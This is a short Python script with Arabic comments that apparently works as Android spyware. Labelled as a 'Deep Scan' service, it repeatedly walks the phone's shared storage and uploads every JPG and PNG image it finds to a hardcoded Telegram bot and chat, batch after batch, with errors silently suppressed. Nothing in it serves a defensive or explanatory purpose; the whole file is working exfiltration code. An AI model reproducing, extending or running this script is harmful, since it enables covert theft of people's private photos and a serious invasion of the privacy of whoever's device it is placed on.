import os
import time
import requests

BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

sent_files = set()

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            r = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def deep_scan():
    # الفحص الشامل لجميع المجلدات لتفادي مشكلة اختلاف المسارات
    base_path = "/storage/emulated/0/"
    count = 0
    
    for root, dirs, files in os.walk(base_path):
        # تجنب مجلدات النظام لعدم البطء
        if "Android" in root:
            continue
            
        for file in files:
            if count >= 20: return # إرسال 20 صورة في كل دورة (10 ثوانٍ)
            
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                path = os.path.join(root, file)
                
                if path not in sent_files:
                    if send_doc(path):
                        sent_files.add(path)
                        count += 1
                        time.sleep(1.5) # تأخير بسيط لراحة البوت

def main():
    time.sleep(5)
    send_msg("🚀 بدء خدمة الفحص الشامل (Deep Scan)")
    
    while True:
        deep_scan()
        # الانتظار 10 ثوانٍ قبل الدورة القادمة
        time.sleep(10)

if __name__ == "__main__":
    main()
